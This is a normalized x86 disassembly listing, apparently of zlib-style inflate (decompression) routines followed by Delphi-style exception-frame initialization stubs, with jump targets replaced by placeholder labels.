cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2c ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov ecx [ esp + 0x34 ]
mov [ ecx ] 0x8
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x2c ]
cmp ecx [ eax + 0x30 ]
je r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x28 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x28 ]
dec ecx
jmp r-xdata
test [ esp + 0x14 ] 0x40
jne r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x14 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x34 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x34 ]
mov [ edx ] 0x2
jmp r-xdata
mov ecx [ esp + 0x1c ]
dec [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x18 ] edx
inc [ esp + 0x20 ]
add [ esp + 0x1c ] 0x8
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jb r-xdata
mov ecx [ esp + 0x1c ]
dec [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x18 ] edx
inc [ esp + 0x20 ]
add [ esp + 0x1c ] 0x8
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jb r-xdata
mov ecx [ esp + 0x34 ]
mov [ ecx ] 0x9
mov eax [ esp + 0x4 ]
mov [ eax + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x14 ]
mov [ eax + 0xc ] edx
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
dec [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x18 ] eax
inc [ esp + 0x20 ]
add [ esp + 0x1c ] 0x8
mov edx [ esp + 0x1c ]
cmp edx [ esp + 0xc ]
jb r-xdata
mov ecx [ esp + 0x1c ]
dec [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x18 ] edx
inc [ esp + 0x20 ]
add [ esp + 0x1c ] 0x8
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jb r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x28 ]
mov cl [ edx ]
mov [ eax ] cl
inc [ esp + 0x30 ]
inc [ esp + 0x28 ]
dec [ esp + 0x2c ]
mov ecx [ esp ]
mov edx [ esp + 0x30 ]
cmp edx [ ecx + 0x28 ]
jne r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x28 ]
jne r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
mov [ esp + 0x8 ] eax
mov eax [ esp ]
mov edx [ eax + 0x30 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x24 ]
mov [ esp + 0x28 ] eax
mov edx [ esp + 0x28 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x2c ]
jae r-xdata
cmp [ esp + 0x8 ] 0x1
mov edx 0x7
je r-xdata
mov [ esp + 0x2c ] ecx
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ esp + 0x14 ] 0x20
je r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
mov [ ecx + 0xc ] eax
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x34 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ esp + 0x34 ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
mov edx [ eax + 0x24 ]
mov [ esp + 0x30 ] edx
cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x2c ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x28 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x28 ]
dec ecx
jmp r-xdata
mov ecx [ esp ]
mov edx [ ecx + 0x28 ]
sub edx [ esp + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x2c ]
sub edx [ esp + 0x28 ]
dec edx
jmp r-xdata
mov eax [ esp + 0x34 ]
mov [ eax ] edx
jmp r-xdata
add edx 0x2
mov ecx [ esp + 0x34 ]
mov [ ecx ] 0x9
mov eax [ esp + 0x4 ]
mov [ eax + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0x34 ]
mov [ edx ] 0x7
jmp r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp ]
mov [ eax + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x30 ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x2c ]
jae r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x2c ]
cmp ecx [ eax + 0x24 ]
je r-xdata
mov [ esp + 0x2c ] ecx
mov edx [ esp + 0x28 ]
mov eax [ esp ]
cmp edx [ eax + 0x28 ]
jne r-xdata
mov [ esp + 0x2c ] edx
mov edx [ esp ]
mov eax [ edx + 0x28 ]
sub eax [ esp + 0x28 ]
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
sub eax [ esp + 0x28 ]
dec eax
jmp r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x28 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x28 ]
dec ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x24 ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x2c ]
jae r-xdata
cmp [ esp + 0x2c ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x2c ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov [ esp + 0x2c ] eax
mov edx [ esp + 0x28 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x28 ]
jne r-xdata
mov [ esp + 0x2c ] ecx
mov edx [ esp ]
mov eax [ edx + 0x28 ]
sub eax [ esp + 0x28 ]
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
sub eax [ esp + 0x28 ]
dec eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp ]
mov [ eax + 0x20 ] edx
mov edx [ esp + 0x1c ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x28 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
mov [ esp + 0x28 ] edx
mov ecx [ esp + 0x28 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
mov [ esp + 0x2c ] eax
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x28 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x28 ]
dec ecx
jmp r-xdata
mov [ esp + 0x2c ] ecx
sub_46a994
push ebx
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov edx [ eax + 0xc ]
mov [ esp + 0x10 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x2c ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x30 ]
ja r-xdata
mov ecx [ esp ]
mov edx [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x30 ]
jmp r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x10 ]
mov [ esp + 0xc ] edx
sub edx [ esp + 0x14 ]
mov [ esp + 0xc ] edx
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ esp + 0xc ]
jae r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
sub [ eax + 0x10 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
add [ ecx + 0x14 ] eax
mov edx [ esp ]
cmp [ edx + 0x34 ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0xc ]
push eax
mov edx [ esp + 0x18 ]
push edx
mov ecx [ esp + 0x18 ]
push ecx
call sub_4626c8
add esp 0xc
mov eax [ esp + 0xc ]
add [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x14 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x28 ]
cmp eax [ esp + 0x14 ]
jne r-xdata
mov eax [ esp ]
mov ebx [ esp ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov eax [ eax + 0x38 ]
call [ ebx + 0x34 ]
mov edx [ esp ]
mov [ edx + 0x38 ] eax
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x30 ] eax
xor ecx ecx
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ ecx + 0xc ] eax
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x2c ] edx
mov eax [ esp + 0x8 ]
add esp 0x18
pop ebx
retn
mov edx [ esp ]
mov ecx [ edx + 0x24 ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x28 ]
cmp edx [ ecx + 0x30 ]
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x30 ]
sub edx [ esp + 0x14 ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x10 ]
cmp eax [ esp + 0xc ]
jae r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x24 ]
mov [ ecx + 0x30 ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x10 ]
mov [ esp + 0xc ] ecx
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
sub [ edx + 0x10 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
add [ eax + 0x14 ] edx
mov ecx [ esp ]
cmp [ ecx + 0x34 ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0xc ]
push eax
mov edx [ esp + 0x18 ]
push edx
mov ecx [ esp + 0x18 ]
push ecx
call sub_4626c8
add esp 0xc
mov eax [ esp + 0xc ]
add [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x14 ] edx
mov eax [ esp ]
mov ebx [ esp ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov eax [ eax + 0x38 ]
call [ ebx + 0x34 ]
mov edx [ esp ]
mov [ edx + 0x38 ] eax
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x30 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
sub_46ab60
push ebp
mov ebp esp
add esp 0xffffffc0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x24 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0x20 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x1c ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x30 ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0x2c ]
cmp ecx [ ebp - 0x28 ]
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x28 ]
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x2c ]
sub edx [ ebp - 0x28 ]
dec edx
jmp r-xdata
mov edx [ ebp - 0x18 ]
and edx [ ebp - 0x30 ]
shl edx 0x3
add edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov al [ edx ]
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
dec [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ ebp - 0x18 ] eax
inc [ ebp - 0x20 ]
add [ ebp - 0x1c ] 0x8
cmp [ ebp - 0x1c ] 0x14
jb r-xdata
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x30 ] ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x10 ]
mov cl [ ecx + 0x1 ]
shr [ ebp - 0x18 ] cl
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax + 0x1 ]
sub [ ebp - 0x1c ] edx
test [ ebp - 0x14 ] 0x10
je r-xdata
mov edx [ ebp - 0x10 ]
mov cl [ edx + 0x1 ]
xor edx edx
shr [ ebp - 0x18 ] cl
mov eax [ ebp - 0x10 ]
mov dl [ eax + 0x1 ]
sub [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + 0x4 ]
mov [ edx ] al
inc [ ebp - 0x28 ]
dec [ ebp - 0x2c ]
jmp r-xdata
test [ ebp - 0x14 ] 0x40
jne r-xdata
and [ ebp - 0x14 ] 0xf
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov eax [ ecx * 4 + rw-data ]
and eax [ ebp - 0x18 ]
add edx eax
mov [ ebp - 0x38 ] edx
mov ecx [ ebp - 0x14 ]
shr [ ebp - 0x18 ] cl
mov edx [ ebp - 0x14 ]
sub [ ebp - 0x1c ] edx
cmp [ ebp - 0x1c ] 0xf
jae r-xdata
cmp [ ebp - 0x2c ] 0x102
jb r-xdata
test [ ebp - 0x14 ] 0x20
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax * 4 + rw-data ]
and edx [ ebp - 0x18 ]
xor eax eax
shl edx 0x3
add ecx edx
mov [ ebp - 0x10 ] ecx
mov al [ ecx ]
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
and edx [ ebp - 0x34 ]
shl edx 0x3
add edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov al [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
dec [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ ebp - 0x18 ] eax
inc [ ebp - 0x20 ]
add [ ebp - 0x1c ] 0x8
cmp [ ebp - 0x1c ] 0xf
jb r-xdata
mov edx [ ebp - 0x1c ]
shr edx 0x3
mov [ ebp - 0x38 ] edx
add [ ebp - 0x24 ] edx
mov eax [ ebp - 0x38 ]
sub [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x7
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov [ ecx ] eax
xor eax eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x30 ] ecx
cmp [ ebp - 0x24 ] 0xa
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] rw-data
mov ecx [ ebp - 0x1c ]
shr ecx 0x3
mov [ ebp - 0x38 ] ecx
add [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x38 ]
sub [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x7
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x20 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov [ ecx ] eax
mov eax 0xfffffffd
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x30 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
shr ecx 0x3
mov [ ebp - 0x38 ] ecx
add [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x38 ]
sub [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x7
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x20 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov [ ecx ] eax
mov eax 0x1
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov cl [ edx + 0x1 ]
xor edx edx
shr [ ebp - 0x18 ] cl
mov eax [ ebp - 0x10 ]
mov dl [ eax + 0x1 ]
sub [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + 0x4 ]
mov [ edx ] al
inc [ ebp - 0x28 ]
dec [ ebp - 0x2c ]
jmp r-xdata
test [ ebp - 0x14 ] 0x40
jne r-xdata
and [ ebp - 0x14 ] 0xf
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jae r-xdata
cmp [ ebp - 0x1c ] 0x14
jae r-xdata
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] rw-data
mov ecx [ ebp - 0x1c ]
shr ecx 0x3
mov [ ebp - 0x38 ] ecx
add [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x38 ]
sub [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x7
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x20 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x20 ]
mov [ ecx ] eax
mov eax 0xfffffffd
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax * 4 + rw-data ]
and edx [ ebp - 0x18 ]
shl edx 0x3
add ecx edx
xor eax eax
mov [ ebp - 0x10 ] ecx
mov al [ ecx ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
mov eax [ ecx * 4 + rw-data ]
and eax [ ebp - 0x18 ]
add edx eax
mov [ ebp - 0x3c ] edx
mov ecx [ ebp - 0x14 ]
shr [ ebp - 0x18 ] cl
mov edx [ ebp - 0x14 ]
sub [ ebp - 0x1c ] edx
mov eax [ ebp - 0x38 ]
sub [ ebp - 0x2c ] eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
sub ecx [ edx + 0x24 ]
cmp ecx [ ebp - 0x3c ]
jb r-xdata
mov ecx [ ebp - 0x1c ]
dec [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ ebp - 0x18 ] edx
inc [ ebp - 0x20 ]
add [ ebp - 0x1c ] 0x8
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x14 ]
jb r-xdata
mov ecx [ ebp - 0x10 ]
mov cl [ ecx + 0x1 ]
shr [ ebp - 0x18 ] cl
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax + 0x1 ]
sub [ ebp - 0x1c ] edx
test [ ebp - 0x14 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
sub ecx [ edx + 0x24 ]
mov eax [ ebp - 0x3c ]
sub eax ecx
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0x28 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x40 ] ecx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x14 ]
jbe r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x40 ] eax
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x28 ]
mov cl [ edx ]
mov [ eax ] cl
inc [ ebp - 0x40 ]
inc [ ebp - 0x28 ]
dec [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x28 ]
mov cl [ edx ]
mov [ eax ] cl
inc [ ebp - 0x40 ]
inc [ ebp - 0x28 ]
dec [ ebp - 0x38 ]
jmp r-xdata
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x28 ]
mov cl [ edx ]
mov [ eax ] cl
inc [ ebp - 0x40 ]
inc [ ebp - 0x28 ]
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
sub [ ebp - 0x38 ] edx
jmp r-xdata
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x28 ]
mov al [ ecx ]
mov [ edx ] al
inc [ ebp - 0x40 ]
inc [ ebp - 0x28 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x24 ]
mov [ ebp - 0x40 ] eax
sub_46aff8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ac#6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b024
retn
sub_46b030
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b055
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b05c
retn
sub_46b068
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b08d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b094
retn
sub_46b0a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b0c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b0cc
retn
sub_46b0d8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ac#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b104
retn
sub_46b110
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b135
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b13c
retn
sub_46b148
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b16d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
